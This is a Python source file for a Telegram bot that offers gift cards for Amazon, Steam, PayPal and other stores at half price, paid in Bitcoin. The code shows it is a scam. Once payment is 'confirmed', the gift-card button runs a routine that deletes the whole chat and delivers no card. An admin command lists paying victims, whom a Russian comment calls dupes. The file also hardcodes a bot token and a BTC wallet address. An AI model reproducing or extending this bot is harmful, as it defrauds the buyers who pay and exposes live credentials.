import telebot
from telebot import types
import os
import re
import time
from functools import wraps


from transaction_pars import parser
from db import DataBase
import CONF


def is_not_banned(func):
    @wraps(func)
    def decorator(message):
        db = DataBase()
        if db.userBan(message.chat.id):
            return func(message)
        else:
            print("Ban!!!")

    return decorator


def Tutorial(message):
    video = open(CONF.PATH+'tutorial/video/video.mp4', 'rb')
    img = open(CONF.PATH+'tutorial/img/proof_img.png', 'rb')
    excemple_link = "📈 Example link to Bitcoin transaction:\n\nhttps://blockchain.com/btc/tx/b0043709bcc0d81a00142dadcc5a162e5355ffcf8b8fdd2e67931287a11c47f7"

    bot.send_video(message.chat.id, video, caption="In this tutorial, we will show how easy and simple it is to buy gift cards using our bot.🚀🚀🚀")
    bot.send_message(message.chat.id, excemple_link)
    bot.send_photo(message.chat.id, img, caption="We only sell high-quality Gift Cards. You can see for yourself.😇")

def deleteAll(call):
    for id in range(call.message.message_id, 0, -1):
        try:
            bot.delete_message(call.from_user.id, id)
        except:
            pass

    # bot.send_message(call.from_user.id, "📊*Amazon Gift cards*\n\n💰 Total Balance: 200$\n💳 Gift card balance: 100$\n📦 Quantity: 2x💳", parse_mode="Markdown")
    # bot.send_message(call.from_user.id, "*2NQA-7BMUX6-YHQQ*", parse_mode="Markdown")
    # bot.send_message(call.from_user.id, "*T4J5-FHD6FM-DHDM*", parse_mode="Markdown")

    

def chekLink(call):
    db = DataBase()

    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_accept = types.InlineKeyboardButton(text="✅ Сheck", callback_data=call.data)
    markup.add(btn_accept)

    try:  

        link = re.sub("^\s+|\n|\r|\s+$", "", db.getLink(call.from_user.id)[0][2])
        price = int(call.data.split(":")[2][:-1])
        mess = parser(link, price)
        # mess = parser(link, 50)

        for mes in mess:
            if mes == True:


                markup = types.InlineKeyboardMarkup(row_width=1)
                btn_accept = types.InlineKeyboardButton(text="🔑 Gift Cards ", callback_data="deleteAll:")
                markup.add(btn_accept)

                mess = "🎉*Congratulations*🎉\n\nTransaction has been confirmed. Click on the button to receive your Gift Card."

                bot.send_message(call.from_user.id, mess, reply_markup = markup, parse_mode="Markdown")

                user_id = call.from_user.id
                try:
                    user_name = "@"+call.from_user.username
                except:
                    user_name = "-"
                shop_name = call.data.split(":")[1]

                db = DataBase()
                db.newOrder(user_id, user_name, shop_name, price)
                return True
            elif mes == mess[-1]:
                bot.send_message(call.from_user.id, mes, reply_markup = markup, parse_mode="Markdown")
            else:
                bot.send_message(call.from_user.id, mes, parse_mode="Markdown")
            time.sleep(2)

    except:
        bot.send_message(call.from_user.id, "(1/3) Link ❌\n\nThe link you provided was not found, or someone has already sent it. Send a new link and try again", reply_markup = markup, parse_mode="Markdown")


def shop_gift(message):
    imgs = os.listdir('gift_card')

    for img in imgs:
        name = img.split('.')[0]


        markup = types.InlineKeyboardMarkup(row_width=2)
        
        first_price = str(CONF.price_1) + "$ (" + str(int(CONF.price_1-CONF.price_1*(CONF.discount/100))) + "$)"
        second_price = str(CONF.price_2) + "$ (" + str(int(CONF.price_2-CONF.price_2*(CONF.discount/100))) + "$)"
        three_price = str(CONF.price_3) + "$ (" + str(int(CONF.price_3-CONF.price_3*(CONF.discount/100))) + "$)"
        four_price = str(CONF.price_4) + "$ (" + str(int(CONF.price_4-CONF.price_4*(CONF.discount/100))) + "$)"

        first_btn= types.InlineKeyboardButton(text=first_price, callback_data="Gift:"+str(name)+":"+first_price)
        second_btn = types.InlineKeyboardButton(text=second_price, callback_data="Gift:"+str(name)+":"+second_price)
        three_btn = types.InlineKeyboardButton(text=three_price, callback_data="Gift:"+str(name)+":"+three_price)
        four_btn = types.InlineKeyboardButton(text=four_price, callback_data="Gift:"+str(name)+":"+four_price)
        markup.add(first_btn, second_btn, three_btn, four_btn)

        bot.send_photo(message.chat.id, open(CONF.PATH+"gift_card/"+img, 'rb'), reply_markup = markup)


def gift_buy(call):
    shop_name = call.data.split(':')[1]
    balance = call.data.split(':')[2].split(' ')[0]
    price = call.data.split(':')[2].split(' ')[1][1:-1]
    numberСards = str(int(int(balance[:-1])/100)) + "x💳"

    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_accept = types.InlineKeyboardButton(text="✅ Сheck", callback_data="chekLink:%s:%s" % (shop_name, price))
    markup.add(btn_accept)


    if shop_name == "Walmart":
        shop_name = "🔆 " + shop_name
    elif shop_name == "Nike":
        shop_name = "👟 " + shop_name
    elif shop_name == "appStore":
        shop_name = "🍏 " + shop_name
    elif shop_name == "Apple":
        shop_name = "🍏 " + shop_name
    elif shop_name == "ebay":
        shop_name = "📺 " + shop_name
    elif shop_name == "GooglePlay":
        shop_name = "📱 " + shop_name
    elif shop_name == "Steam":
        shop_name = "🎮 " + shop_name
    elif shop_name == "Amazon":
        shop_name = "📊 " + shop_name
    elif shop_name == "PayPal":
        shop_name = "💲 " + shop_name

    info_message = "*" + shop_name + " Gift card*\n\n" + "💰 Total balance: " + balance + "\n💳 Gift card balance: 100$\n📦 Quantity: " + numberСards + "\n🔥 Discount: 50% ❗first sale only❗\n💸 Price: " + price + "\n\nIn order to receive a Gift Card, transfer *%s* to this Bitcoin wallet.\n\nBtc:" % (price)
    btc_message = "*bc1qt6y69dvkwfu9crqvmmf2wx3y24p68ptkep82d9*"
    after_message = "After payment, send the transaction link and click the *CHECK* button"


    bot.send_message(call.from_user.id, info_message, parse_mode="Markdown")
    bot.send_message(call.from_user.id, btc_message, parse_mode="Markdown")
    bot.send_message(call.from_user.id, after_message, parse_mode="Markdown", reply_markup = markup)


bot = telebot.TeleBot("944212634:AAF80_96RqGSixn3NLE3PGIcnpFN-e-_0YU", threaded=False)


# /ExitBan
@bot.message_handler(commands=['ExitBan'])
def ExitBan(message):
    db = DataBase()
    mess = db.ExitBan(message.chat.id)
    
    bot.send_message(message.chat.id, mess)

# /Список Лапухов
@bot.message_handler(commands=['getBurdock'])
def Burdock(message):
    db = DataBase()
    burdocks = db.getOrder()

    try:
        for burdock in burdocks:
            order_n = burdock[0]
            user_name = burdock[2]
            shop_name = burdock[3]
            price = burdock[4]
            mess = "🏆 Заказ № %d\n\n👮 Пользователь: %s\n💒 Магазин: %s\n💰 Цена: %d$" % (order_n, user_name, shop_name, price)

            bot.send_message(message.chat.id, mess)
    except:
        mess = "❗Заказов нет❗"

        bot.send_message(message.chat.id, mess)


# /ClickCount
@bot.message_handler(commands=['ClickCount'])
def ClickCount(message):
    db = DataBase()

    if db.getClickCount() == False:
        mess = "📌 № 0"
    else:
        mess = "📌 № %d" % (db.getClickCount())

    bot.send_message(message.chat.id, mess)


# /getClick
@bot.message_handler(commands=['getClick'])
def getClick(message):
    db = DataBase()

    if len(message.text) == 9:
        click = db.getClick()
    else:
        try:
            count = int(message.text.split("\n")[1])
        except:
            count = 1

        click = db.getClick(count)

    if db.getClick() == False:
        mess = "📌 № 0"
        bot.send_message(message.chat.id, mess)
    else:
        for click in click:
            mess = "📌 № %d\n👮 %s" %(click[0], click[2])
            bot.send_message(message.chat.id, mess)

# /start
@bot.message_handler(commands=['start'])
@is_not_banned
def start(message):
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.row('💳 Gift cards', '📹 Tutorial')
    # markup.row('👮 Accounts', '💳 Gift cards')

    mess = CONF.start
    
    bot.send_message(message.chat.id, mess, reply_markup=markup)


    if not message.from_user.username:
        user_name = "-"
    else:
        user_name = "@"+message.from_user.username


    db = DataBase()
    db.newClick(message.chat.id, user_name)



# /help
@bot.message_handler(commands=['help'])
@is_not_banned
def help(message):

    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.row('💳 Gift cards', '📹 Tutorial')
    # markup.row('👮 Accounts', '💳 Gift cards')
    
    mess = CONF.help

    bot.send_message(message.chat.id, mess, reply_markup=markup)


@bot.message_handler(content_types=['text'])
@is_not_banned
def message_main(message):
    if message.text == '👮 Accounts':
        bot.receive()
        bot.send_message(message.chat.id, '123')
    elif message.text == '💳 Gift cards':
        shop_gift(message)
    elif message.text == '📹 Tutorial':
        Tutorial(message)
    elif message.text[0:8] == 'https://' or message.text[0:7] == 'http://':
        db = DataBase() 
        db.newLink(message.chat.id, message.text)


@bot.callback_query_handler(func=lambda call: True)
def call_main(call):
    if call.data.split(":")[0] == "Gift":
        gift_buy(call)
    elif call.data.split(":")[0] == "chekLink":
        chekLink(call)
    elif call.data.split(":")[0] == "deleteAll":
        deleteAll(call)

bot.polling()
# while True:
#     try:
#         bot.polling(none_stop=True)
#     except:
#         time.sleep(2)




